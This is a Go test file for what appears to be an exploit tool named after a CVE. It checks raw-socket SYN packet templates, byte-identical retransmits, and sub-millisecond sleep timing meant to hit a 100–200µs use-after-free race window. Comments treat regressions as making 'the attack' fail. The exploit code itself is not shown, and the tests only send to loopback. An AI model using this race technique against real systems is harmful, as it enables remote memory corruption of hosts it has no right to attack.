package race

import (
	"bytes"
	"net"
	"os"
	"testing"
	"time"

	"cve98432/internal/config"
	"cve98432/internal/netio"
	"cve98432/internal/packet"
)

// TestWorkerBuffersCopyTemplates is a regression test for the
// zero-filled per-flow buffers (C1): make([]byte, len) without a
// copy left the IP version nibble at 0, so every sendto() failed
// with EINVAL and the attack was a silent no-op. The per-flow
// buffers must be exact copies of the templates.
func TestWorkerBuffersCopyTemplates(t *testing.T) {
	e := New(config.Default())
	syn1, syn2, _, err := e.buildTemplates()
	if err != nil {
		t.Fatalf("buildTemplates: %v", err)
	}
	buf1, buf2 := copyTemplates(syn1, syn2)
	if !bytes.Equal(buf1, syn1) {
		t.Error("buf1 must be a byte-for-byte copy of syn1")
	}
	if !bytes.Equal(buf2, syn2) {
		t.Error("buf2 must be a byte-for-byte copy of syn2")
	}
	if buf1[0]>>4 != 4 {
		t.Errorf("IP version nibble = %d, want 4 (zero-filled buffer?)", buf1[0]>>4)
	}
}

// TestRetransmitByteIdentity: after per-round patching and
// Rechecksum, the retransmit must be byte-identical to the first
// SYN (same 4-tuple, same seq, same IP ID, same options).
func TestRetransmitByteIdentity(t *testing.T) {
	e := New(config.Default())
	syn1, syn2, tcpStart, err := e.buildTemplates()
	if err != nil {
		t.Fatalf("buildTemplates: %v", err)
	}
	// Snapshot the pristine templates first so we can prove patching
	// the per-flow copies does not mutate the shared templates.
	pristine1 := append([]byte(nil), syn1...)
	buf1, buf2 := copyTemplates(syn1, syn2)
	patch(buf1, tcpStart, 40000, 0x01020304, 0x1234)
	patch(buf2, tcpStart, 40000, 0x01020304, 0x1234)
	packet.Rechecksum(buf1)
	packet.Rechecksum(buf2)
	if !bytes.Equal(buf1, buf2) {
		t.Error("retransmit must be byte-identical to the first SYN")
	}
	// The copy really was mutated by the per-round patching.
	if bytes.Equal(buf1, pristine1) {
		t.Error("copy must differ from the template after patch")
	}
	// ...and the shared template is left untouched (each flow owns
	// its own buffers).
	if !bytes.Equal(syn1, pristine1) {
		t.Error("patching a flow buffer must not mutate the template")
	}
}

// TestSendLiveTemplate verifies that a built template actually goes
// out through a raw socket (C1's zero buffers made every sendto()
// fail with EINVAL). Sends exactly one SYN to loopback; skipped
// without CAP_NET_RAW.
func TestSendLiveTemplate(t *testing.T) {
	if os.Geteuid() != 0 {
		t.Skip("requires CAP_NET_RAW (run as root)")
	}
	e := New(config.Default())
	syn1, _, _, err := e.buildTemplates()
	if err != nil {
		t.Fatalf("buildTemplates: %v", err)
	}
	snd, err := netio.OpenSender("")
	if err != nil {
		t.Fatalf("open sender: %v", err)
	}
	defer snd.Close()
	buf := append([]byte(nil), syn1...)
	if err := snd.Send(buf, net.ParseIP("127.0.0.1"), 9); err != nil {
		t.Fatalf("Send: %v (zero-filled buffer?)", err)
	}
}

// TestPreciseSleepTiming bounds the actual duration of preciseSleep
// at the default 150µs delta. The UAF window is 100–200µs, so a
// delta that lands ~1ms late (sub-millisecond time.Sleep on a
// coarse-timer system) is a functional regression, not just noise:
// the majority of sleeps must stay under 800µs. The lower bound
// catches an undershooting timer.
func TestPreciseSleepTiming(t *testing.T) {
	const n = 200
	const want = 150 * time.Microsecond
	short, long := 0, 0
	for i := 0; i < n; i++ {
		t0 := time.Now()
		preciseSleep(want)
		d := time.Since(t0)
		if d < want/2 {
			short++
		}
		if d > 800*time.Microsecond {
			long++
		}
	}
	if short > n/4 {
		t.Errorf("%d/%d sleeps under 75µs (want ~150µs minus slack)", short, n)
	}
	if long > n/4 {
		t.Errorf("%d/%d sleeps over 800µs — the delta would miss the 100–200µs UAF window (coarse timer + sleep?)", long, n)
	}
}

// BenchmarkPreciseSleep150us / BenchmarkPreciseSleep10us measure the
// cost of the hybrid sleep+spin at the default delta and at a small
// sub-tail duration (run with -bench; informational).
func BenchmarkPreciseSleep150us(b *testing.B) {
	for i := 0; i < b.N; i++ {
		preciseSleep(150 * time.Microsecond)
	}
}

func BenchmarkPreciseSleep10us(b *testing.B) {
	for i := 0; i < b.N; i++ {
		preciseSleep(10 * time.Microsecond)
	}
}
